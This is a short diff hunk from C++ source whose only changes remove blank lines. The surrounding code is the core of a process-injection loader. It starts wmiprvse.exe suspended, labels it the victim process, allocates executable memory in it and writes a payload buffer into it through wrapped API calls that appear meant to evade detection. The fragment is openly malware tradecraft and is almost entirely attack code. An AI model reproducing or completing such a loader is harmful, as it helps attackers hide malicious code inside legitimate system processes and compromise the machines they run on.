@@ -156,19 +156,15 @@ int main() {
 	STARTUPINFOA si = { 0 };
 	PROCESS_INFORMATION pi = { 0 };
 
-
     pwCreateProcess("C:\\Windows\\System32\\wbem\\wmiprvse.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
 	
-
 	HANDLE victimProcess = pi.hProcess;
 	HANDLE threadHandle = pi.hThread;
-
 
     LPVOID shellAddress = pwVirtualAllocEx(victimProcess, NULL, payload.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
     PVOID pBaseAddress = nullptr;
     SIZE_T* bytesWritten = 0;
-
 
     pwProcmem(victimProcess, shellAddress, payload.data(), payload.size(), bytesWritten);
 
